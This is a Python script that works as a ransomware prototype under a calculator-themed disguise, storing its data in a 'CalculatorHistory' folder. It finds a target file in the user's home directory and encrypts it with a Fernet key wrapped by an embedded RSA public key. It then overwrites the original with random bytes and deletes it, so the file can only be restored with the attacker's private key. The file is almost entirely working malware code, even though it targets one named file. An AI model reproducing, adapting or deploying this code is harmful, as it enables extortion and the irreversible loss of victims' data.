from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
import json
import os
from platformdirs import user_documents_dir
import re
import sys
import shutil

dek = Fernet.generate_key()

def present_func() -> str:
    document_path = user_documents_dir()
    present_path = os.path.join(document_path, "CalculatorHistory", "Present")
    return present_path

def present_creation():
    document_path = user_documents_dir()
    present_path = os.path.join(document_path, "CalculatorHistory", "Present")
    os.makedirs(present_path, exist_ok=True)

def resource_path(relative_path): #for accessing sym key to encrypt via pyinstaller temp file (to make just a single exe)
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
pubkey_path = resource_path("public_key.pem")

def find(file_name): #return path of file
    search_root = os.path.expanduser("~")
    
    for root, dirs, files in os.walk(search_root, onerror=lambda e: None):
        try:
            if file_name in files:
                return os.path.join(root, file_name)
        except:
            continue
    return None

def read(file): #returns file contents
    try:
        with open(file, "r") as f:
            return f.read()
    except:
        pass       

def asym_encrypt(): #asym encrypt the sym key (which again is packaged into exe)
    with open(pubkey_path, "rb") as key_file:
        public_key_data = key_file.read()

    public_key = serialization.load_pem_public_key(public_key_data)
    kek = public_key.encrypt(
        dek,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    return kek

def file_check(path):
    try:
        os.path.exists(path)
        return True
    except:
        return False
        print("File check error")

def path_count(path):
    count = 0
    for char in path:
        count += 1
    return str(count) + "^"

def packing(path): #pack the data within specified format and return a packed file
    if file_check(path):
        with open(path, "r") as f:
            data = f.read()

    count = path_count(path)
    package = str(count) + path + data
    return package

def crypt(file_info="", option=int):
    present_creation()
    file_path = os.path.join(present_func(), "encryption.txt")
    if file_info or file_info == "":
        if option == 1: #sym encrypt package and envelope asym pubbed sym key
            data = {
            "has_ran": True
            }
            file_info = packing(find("my_file.txt"))
            
            cipher_suite = Fernet(dek)
            cipher_text = cipher_suite.encrypt(file_info.encode("utf-8"))
            with open(file_path, "wb") as f:
                f.write(cipher_text + asym_encrypt())

            with open(f"{present_func()}/muzzle.json", "w") as f:
                json.dump(data, f)
    elif not file_info:
        pass

def delete(file_path): #removes unencrypted, found file from machine
    global dek
    if not os.path.exists(file_path):
        pass
    with open(file_path, "ba+") as f:
        length = f.tell()
    with open(file_path, "br+") as f:
        for _ in range(3):
            f.seek(0)
            f.write(os.urandom(length))
            f.flush()
            os.fsync(f.fileno())
    os.remove(file_path)
    dek = "I hope this isn't floating in memory somewhere."

def peel_count(data): #returns number from package
    data_without_count = ""
    for char in data:
        if char != "^":
            data_without_count += char
        else:
            break
    return data_without_count

def peel_path(ct, data): #returns path from package
    beg = rf"^{ct}\^" 
    number_removed = re.sub(beg, "", data, count=1)
    extracted_path = ""

    c = 0
    while c < int(ct):
        extracted_path += number_removed[c]
        c += 1
    return extracted_path
    
def unpacking(data): #grab packed data to unpack and direct it using the headed info
    count = peel_count(data)
    peeled_path = peel_path(count, data)

    with open(peeled_path, "w") as f:
        f.write(data[int(count) + (len(count) + 1):])

def release(): #decrypts and "unpacks" envelope
    remove_present = False
    encrypted_file_path = os.path.join(present_func(), "encryption.txt")
    with open(encrypted_file_path, "rb") as f:
        encrypted_data = f.read()  
    preceding_bytes = encrypted_data[:-256]
    asym_key = encrypted_data[-256:]

    private_key_path = os.path.join(present_func(), "private_key.pem")

    with open(private_key_path, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None
        )
    decrypted_dek = private_key.decrypt(
        asym_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
            )
        )
    try:
        cipher_suite = Fernet(decrypted_dek)
        decrypted_text = cipher_suite.decrypt(preceding_bytes)

        decrypted_text = decrypted_text.decode("utf-8")
        unpacking(decrypted_text)

        remove_present = True
    except:
        pass
    if remove_present:
        try:
            shutil.rmtree(present_func())
        except:
            pass

def start(): #if muzzle exists due to encryption firing, start won't run
    count = 0
    if os.path.exists(f"{present_func()}/muzzle.json"):
        count = 1
    if count == 0:
        try:
            crypt(read(find("my_file.txt")), 1)
        except:
            pass
        try:
            delete(find("my_file.txt"))
        except:
            pass

if __name__ == '__main__':
    start()